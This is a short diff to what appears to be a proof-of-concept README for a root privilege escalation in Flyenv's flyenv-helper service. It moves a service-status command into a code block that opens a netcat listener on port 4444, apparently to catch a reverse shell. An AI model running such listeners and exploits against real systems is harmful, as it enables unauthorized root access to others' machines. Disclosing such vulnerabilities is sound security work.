@@ -10,9 +10,10 @@ Any local, unprivileged user can execute arbitrary commands as **root**.
 ### Usage
 
 Execute Flyenv and make sure that flyenv-helper is installed and running: 
-systemctl status flyenv-helper
 
 ```bash
+systemctl status flyenv-helper
+
 # Terminal 1 — listener
 nc -lvnp 4444
 
